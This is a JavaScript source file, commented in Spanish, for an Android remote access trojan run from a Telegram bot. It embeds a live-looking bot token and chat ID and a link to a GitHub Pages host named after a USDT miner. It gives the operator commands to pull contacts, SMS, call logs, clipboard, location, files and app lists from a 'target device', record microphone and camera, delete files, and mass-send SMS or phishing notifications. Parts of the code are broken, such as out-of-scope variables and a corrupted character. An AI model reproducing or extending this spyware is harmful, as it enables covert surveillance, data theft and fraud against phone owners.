// Configuración inicial
const token = '7603508622:AAHduDcxlylbwFxpH7YpC02UJT43R31wmuk';
const chatId = '8064474906';
const bot = new TelegramBot(token, {polling: true});
const clients = new Map();
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Manejo de conexiones WebSocket (simulado para móvil)
function setupWebSocket() {
    // Aquí implementarías la conexión WebSocket según tu framework móvil
    // Por ejemplo, usando WebSocket nativo o alguna librería específica
    const ws = new WebSocket('https://UsdtMinnerPro.github.io/archivo.js');
    
    ws.onopen = () => {
        const uuid = generateUUID();
        const deviceInfo = {
            model: device.model,
            battery: device.batteryLevel,
            version: device.osVersion,
            brightness: device.brightness,
            provider: device.carrier
        };
        
        clients.set(uuid, deviceInfo);
        sendToBot(`°• Nuevo dispositivo conectado\n\n` +
            `• Modelo: <b>${deviceInfo.model}</b>\n` +
            `• Batería: <b>${deviceInfo.battery}</b>\n` +
            `• Versión Android: <b>${deviceInfo.version}</b>\n` +
            `• Brillo: <b>${deviceInfo.brightness}</b>\n` +
            `• Proveedor: <b>${deviceInfo.provider}</b>`, {parse_mode: "HTML"});
    };
    
    ws.onmessage = (event) => {
        const command = event.data.split(':')[0];
        const params = event.data.split(':')[1];
        
        switch(command) {
            case 'send_message':
                const [number, message] = params.split('/');
                sendSMS(number, message);
                break;
            case 'send_message_to_all':
                sendSMSToAllContacts(params);
                break;
            case 'file':
                sendFileToServer(params);
                break;
            case 'delete_file':
                deleteFile(params);
                break;
            case 'microphone':
                recordAudio(params);
                break;
            case 'rec_camera_main':
                recordMainCamera(params);
                break;
            case 'rec_camera_selfie':
                recordSelfieCamera(params);
                break;
            case 'toast':
                showToast(params);
                break;
            case 'show_notification':
                const [title, link] = params.split('/');
                showNotification(title, link);
                break;
            case 'play_audio':
                playAudio(params);
                break;
            case 'calls':
                sendCallLogs();
                break;
            case 'contacts':
                sendContacts();
                break;
            case 'messages':
                sendMessages();
                break;
            case 'apps':
                sendInstalledApps();
                break;
            case 'device_info':
                sendDeviceInfo();
                break;
            case 'clipboard':
                sendClipboardContent();
                break;
            case 'camera_main':
                takeMainCameraPhoto();
                break;
            case 'camera_selfie':
                takeSelfiePhoto();
                break;
            case 'location':
                sendLocation();
                break;
            case 'vibrate':
                vibrateDevice();
                break;
            case 'stop_audio':
                stopAudio();
                break;
            case 'ping':
                // Responder al ping para mantener la conexión
                ws.send('pong');
                break;
        }
    };
    
    ws.onclose = () => {
        const deviceInfo = clients.get(uuid);
        if (deviceInfo) {
            sendToBot(`°• Dispositivo desconectado\n\n` +
                `• Modelo: <b>${deviceInfo.model}</b>\n` +
                `• Batería: <b>${deviceInfo.battery}</b>\n` +
                `• Versión Android: <b>${deviceInfo.version}</b>\n` +
                `• Brillo: <b>${deviceInfo.brightness}</b>\n` +
                `• Proveedor: <b>${deviceInfo.provider}</b>`, {parse_mode: "HTML"});
            clients.delete(uuid);
        }
    };
}

// Función para enviar mensajes al bot
function sendToBot(message, options = {}) {
    bot.sendMessage(chatId, message, options);
}

// Función para enviar archivos al bot
function sendFileToBot(fileBuffer, fileName, caption) {
    bot.sendDocument(chatId, fileBuffer, {
        caption: caption,
        parse_mode: "HTML"
    }, {
        filename: fileName,
        contentType: 'application/octet-stream',
    });
}

// Generar UUID
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// Manejo de comandos del bot
bot.on('message', (message) => {
    if (message.chat.id != chatId) {
        sendToBot('°• Permiso denegado');
        return;
    }

    if (message.text == '/start') {
        sendWelcomeMessage();
    } else if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        listConnectedDevices();
    } else if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        showDeviceSelection();
    } else if (message.reply_to_message) {
        handleReplyMessages(message);
    }
});

// Manejo de callbacks de botones inline
bot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');
    
    if (command == 'device') {
        showCommandSelection(uuid, msg);
    } else {
        executeCommand(command, uuid, msg);
    }
});

// Funciones auxiliares
function sendWelcomeMessage() {
    sendToBot(
        '°• Bienvenido al panel de control\n\n' +
        '• Si la aplicación está instalada en el dispositivo objetivo, espera la conexión\n\n' +
        '• Cuando recibas el mensaje de conexión, significa que el dispositivo está conectado y listo\n\n' +
        '• Haz clic en el botón de comandos y selecciona el dispositivo y comando deseado\n\n' +
        '• Si tienes problemas, envía /start',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        }
    );
}

function listConnectedDevices() {
    if (clients.size == 0) {
        sendToBot('°• No hay dispositivos conectados');
    } else {
        let text = '°• Lista de dispositivos conectados:\n\n';
        clients.forEach((value, key) => {
            text += `• Modelo: <b>${value.model}</b>\n` +
                   `• Batería: <b>${value.battery}</b>\n` +
                   `• Versión Android: <b>${value.version}</b>\n` +
                   `• Brillo: <b>${value.brightness}</b>\n` +
                   `• Proveedor: <b>${value.provider}</b>\n\n`;
        });
        sendToBot(text, {parse_mode: "HTML"});
    }
}

function showDeviceSelection() {
    if (clients.size == 0) {
        sendToBot('°• No hay dispositivos conectados');
    } else {
        const deviceListKeyboard = [];
        clients.forEach((value, key) => {
            deviceListKeyboard.push([{text: value.model, callback_data: `device:${key}`}]);
        });
        
        sendToBot('°• Selecciona dispositivo para ejecutar comando', {
            reply_markup: {inline_keyboard: deviceListKeyboard}
        });
    }
}

function showCommandSelection(uuid, msg) {
    const device = clients.get(uuid);
    bot.editMessageText(`°• Selecciona comando para: <b>${device.model}</b>`, {
        chat_id: msg.chat.id,
        message_id: msg.message_id,
        reply_markup: {
            inline_keyboard: [
                [
                    {text: 'Apps', callback_data: `apps:${uuid}`},
                    {text: 'Info dispositivo', callback_data: `device_info:${uuid}`}
                ],
                [
                    {text: 'Obtener archivo', callback_data: `file:${uuid}`},
                    {text: 'Eliminar archivo', callback_data: `delete_file:${uuid}`}
                ],
                [
                    {text: 'Portapapeles', callback_data: `clipboard:${uuid}`},
                    {text: 'Micrófono', callback_data: `microphone:${uuid}`},
                ],
                [
                    {text: 'Cámara principal', callback_data: `camera_main:${uuid}`},
                    {text: 'Cámara frontal', callback_data: `camera_selfie:${uuid}`}
                ],
                [
                    {text: 'Ubicación', callback_data: `location:${uuid}`},
                    {text: 'Toast', callback_data: `toast:${uuid}`}
                ],
                [
                    {text: 'Llamadas', callback_data: `calls:${uuid}`},
                    {text: 'Contactos', callback_data: `contacts:${uuid}`}
                ],
                [
                    {text: 'Vibrar', callback_data: `vibrate:${uuid}`},
                    {text: 'Notificación', callback_data: `show_notification:${uuid}`}
                ],
                [
                    {text: 'Mensajes', callback_data: `messages:${uuid}`},
                    {text: 'Enviar SMS', callback_data: `send_message:${uuid}`}
                ],
                [
                    {text: 'Reproducir audio', callback_data: `play_audio:${uuid}`},
                    {text: 'Detener audio', callback_data: `stop_audio:${uuid}`},
                ],
                [
                    {text: 'Enviar SMS a todos', callback_data: `send_message_to_all:${uuid}`}
                ]
            ]
        },
        parse_mode: "HTML"
    });
}

function executeCommand(command, uuid, msg) {
    currentUuid = uuid;
    
    switch(command) {
        case 'calls':
        case 'contacts':
        case 'messages':
        case 'apps':
        case 'device_info':
        case 'clipboard':
        case 'camera_main':
        case 'camera_selfie':
        case 'location':
        case 'vibrate':
        case 'stop_audio':
            // Comandos que no requieren entrada adicional
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Tu solicitud está en proceso\n\n• Recibirás una respuesta pronto', {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 �𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    resize_keyboard: true
                }
            });
            // Enviar comando al WebSocket
            ws.send(`${command}`);
            break;
            
        case 'send_message':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Responde con el número para enviar SMS\n\n' +
                '• Para números locales, usa 0 al inicio o código de país',
                {reply_markup: {force_reply: true}});
            break;
            
        case 'send_message_to_all':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce el mensaje para enviar a todos los contactos',
                {reply_markup: {force_reply: true}});
            break;
            
        case 'file':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce la ruta del archivo a descargar\n\n' +
                '• Ejemplo: DCIM/Camera',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
            
        case 'delete_file':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce la ruta del archivo a eliminar\n\n' +
                '• Ejemplo: DCIM/Camera',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
            
        case 'microphone':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce duración de grabación (segundos)',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
            
        case 'toast':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce el mensaje para mostrar como toast',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
            
        case 'show_notification':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce el mensaje para la notificación',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
            
        case 'play_audio':
            bot.deleteMessage(msg.chat.id, msg.message_id);
            sendToBot('°• Introduce el enlace de audio a reproducir',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"});
            break;
    }
}

function handleReplyMessages(message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('°• Responde con el número para enviar SMS')) {
        currentNumber = message.text;
        sendToBot('°• Ahora introduce el mensaje a enviar\n\n' +
            '• El mensaje no se enviará si excede el límite de caracteres',
            {reply_markup: {force_reply: true}});
            
    } else if (replyText.includes('°• Ahora introduce el mensaje a enviar')) {
        ws.send(`send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce el mensaje para enviar a todos los contactos')) {
        ws.send(`send_message_to_all:${message.text}`);
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce la ruta del archivo a descargar')) {
        ws.send(`file:${message.text}`);
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce la ruta del archivo a eliminar')) {
        ws.send(`delete_file:${message.text}`);
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce duración de grabación (segundos)')) {
        ws.send(`microphone:${message.text}`);
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce el mensaje para mostrar como toast')) {
        ws.send(`toast:${message.text}`);
        currentUuid = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce el mensaje para la notificación')) {
        currentTitle = message.text;
        sendToBot('°• Ahora introduce el enlace a abrir con la notificación',
            {reply_markup: {force_reply: true}});
            
    } else if (replyText.includes('°• Ahora introduce el enlace a abrir con la notificación')) {
        ws.send(`show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        currentTitle = '';
        sendConfirmation();
        
    } else if (replyText.includes('°• Introduce el enlace de audio a reproducir')) {
        ws.send(`play_audio:${message.text}`);
        currentUuid = '';
        sendConfirmation();
    }
}

function sendConfirmation() {
    sendToBot('°• Tu solicitud está en proceso\n\n• Recibirás una respuesta pronto', {
        parse_mode: "HTML",
        reply_markup: {
            keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            resize_keyboard: true
        }
    });
}

// Inicializar la conexión
setupWebSocket();